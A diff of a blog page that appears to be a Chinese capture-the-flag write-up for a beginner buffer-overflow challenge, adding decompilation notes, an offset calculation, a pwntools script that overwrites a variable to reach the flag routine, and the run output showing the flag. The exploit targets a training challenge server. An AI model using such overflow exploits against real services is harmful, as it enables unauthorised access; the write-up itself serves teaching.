@@ -180,7 +180,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-10-27 21:56:07 / Modified: 22:22:00" itemprop="dateCreated datePublished" datetime="2021-10-27T21:56:07+08:00">2021-10-27</time>
+      <time title="Created: 2021-10-27 21:56:07 / Modified: 22:52:56" itemprop="dateCreated datePublished" datetime="2021-10-27T21:56:07+08:00">2021-10-27</time>
     </span>
 
   
@@ -195,7 +195,25 @@
     <div class="post-body" itemprop="articleBody">
           <p>首先，我们看到题目：</p>
 <p><img src="image-20211027220220140.png" alt="image-20211027220220140"></p>
-<p><img src="bg.jpg"></p>
+<p>下载附件，ida反编译并找出主函数：</p>
+<p><img src="image-20211027224506556.png" alt="image-20211027224506556"></p>
+<p>看到read函数，初步判断是栈溢出题</p>
+<p>进入sub函数查看：</p>
+<p><img src="image-20211027224643668.png" alt="image-20211027224643668"></p>
+<p>ok，解题思路：只要能连接上服务器，并执行该文件，在与服务器交互中，输入一串payload使程序中的dword_60106C值变为1853186401后进入sub函数我们就能拿到服务器上的flag。</p>
+<p>好的，先让我们阅读一下read（）函数，点进read（）函数中的unk_601068变量</p>
+<p><img src="image-20211027224714446.png" alt="image-20211027224714446"></p>
+<p>对比一下：</p>
+<p><img src="image-20211027224732285.png" alt="image-20211027224732285"></p>
+<p>发现这两个变量的偏移量为6C-68 = 4（16进制）</p>
+<p>因此我们可以构造payload = ‘aaaa’+p64(1853186401)，具体脚本如下：</p>
+<p><img src="C:\blog\source_posts\Note.assets\image-20211027224758038.png" alt="image-20211027224758038"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&#x27;63031&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;lets get helloworld for bof&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python gfsj1.py</span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 54083: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;6a5a35ff4fd3d526fbb7a7263ec67500&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ </span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Closed connection to 111.200.241.244 port 54083</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
